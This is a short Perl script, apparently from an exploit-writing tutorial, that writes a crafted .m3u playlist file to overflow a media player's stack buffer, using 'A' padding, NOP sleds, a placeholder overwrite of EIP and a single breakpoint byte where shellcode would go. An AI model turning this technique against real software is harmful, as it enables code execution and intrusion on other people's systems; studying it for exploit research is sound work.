my $file= "test1.m3u";
my $buffersize = 26074;

my $junk= "A" x 250; # Should be at 257 but we use the extra 7 bytes for the nopSled
my $nop = "\x90" x 50;  
my $shellcode = "\xcc"; 

my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = "BBBB";
my $preshellcode = "X" x 54;  #let's pretend this is the only space we have available
my $nop2 = "\x90" x 230;  #added some nops to visually separate our 54 X's from other data

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print "Size of buffer : ".length($buffer)."\n";

open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$nop2;
close($FILE);
print "m3u File Created successfully\n";

